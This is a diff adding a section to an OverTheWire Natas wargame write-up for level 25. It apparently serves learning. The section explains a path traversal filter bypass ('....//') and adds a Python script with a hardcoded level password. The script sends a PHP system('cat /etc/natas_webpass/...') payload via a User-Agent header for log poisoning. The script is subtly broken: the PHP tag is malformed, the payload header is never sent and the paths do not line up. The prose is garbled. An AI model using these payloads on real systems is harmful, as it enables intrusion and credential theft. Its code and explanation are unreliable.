@@ -1273,3 +1273,39 @@ Step 7: Then we will get the password for level-25
 
 ## Explination
 
+include funtion will display our contents
+
+diversary traversal attack, if you could some how travel to the root directory to the websever
+
+as we can see safe include funtion ../ symbole get replaced by empty stringso we will not able to thhe root directory   
+
+../ it will not remove , we do not know how many strings go back
+
+..// use this symbole however many directories we are still able to reach to root directory
+
+import requests
+import re
+
+username = 'natas25'
+password = 'ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws'
+
+url = 'http://natas25.natas.labs.overthewire.org'
+
+session = requests.Session()
+
+newHeaders = {
+    "user-Agent" : "?php system('cat /etc/natas_webpass/natas26'); ?>"
+}
+response = session.get(url, auth=(username, password))
+sessionID = response.cookies['PHPSESSID']
+
+response = session.post(
+    url,
+    auth = (username, password), data = {
+         "lang" : "....//....//....//var/www/natas_webpass/natas26/logs/n"
+    }
+)
+
+print(response.text)
+
+
